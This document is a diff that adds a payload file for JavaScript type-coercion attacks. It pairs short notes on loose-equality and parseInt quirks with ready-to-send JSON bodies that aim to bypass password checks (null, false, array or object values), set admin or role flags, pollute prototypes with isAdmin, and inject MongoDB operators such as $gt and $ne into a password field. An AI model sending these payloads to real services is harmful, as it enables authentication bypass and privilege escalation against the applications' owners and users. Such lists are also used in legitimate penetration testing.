@@ -1,0 +1,65 @@
+# ============================================================
+# Type Juggling — JavaScript Type Coercion
+# ============================================================
+
+# ---- Loose Equality (==) Tricks ----
+# null == undefined → true
+# null == 0 → false
+# undefined == 0 → false
+# NaN == NaN → false (!)
+# [] == false → true
+# [] == 0 → true
+# {} == false → false
+# "" == false → true
+# "0" == false → true
+# " " == false → true
+# [0] == false → true
+# [[]] == false → true
+
+# ---- Type Coercion Payloads (JSON) ----
+{"password": null}
+{"password": undefined}
+{"password": false}
+{"password": 0}
+{"password": []}
+{"password": {}}
+{"admin": true}
+{"role": null}
+{"verified": 1}
+
+# ---- parseInt / parseFloat Tricks ----
+# parseInt("1abc") → 1
+# parseFloat("1.5abc") → 1.5
+# parseInt("0x10") → 16
+# parseInt("010") → 8 (octal, old engines)
+{"amount": "0"}
+{"amount": "1e5"}
+{"count": "010"}
+
+# ---- NaN Comparisons ----
+# NaN !== NaN → true
+# isNaN(undefined) → true
+# isNaN("hello") → true
+{"value": "NaN"}
+{"value": null}
+
+# ---- Array/Object Coercion ----
+# [1,2]+[3,4] → "1,23,4"
+# {}+[] → "[object Object]"
+# []+{} → "[object Object]"
+# [] + {} = "[object Object]"
+{"id": []}
+{"id": {}}
+{"ids": "1,2,3"}
+{"ids": ["1","2","3"]}
+
+# ---- Prototype Pollution via Type Coercion ----
+# __proto__ gets treated as object key
+{"__proto__": {"isAdmin": true}}
+{"constructor": {"prototype": {"isAdmin": true}}}
+
+# ---- NoSQL Comparison Bypass ----
+# MongoDB: {"$gt":""} always true
+{"password": {"$gt": ""}}
+{"password": {"$ne": null}}
+{"password": {"$exists": true}}
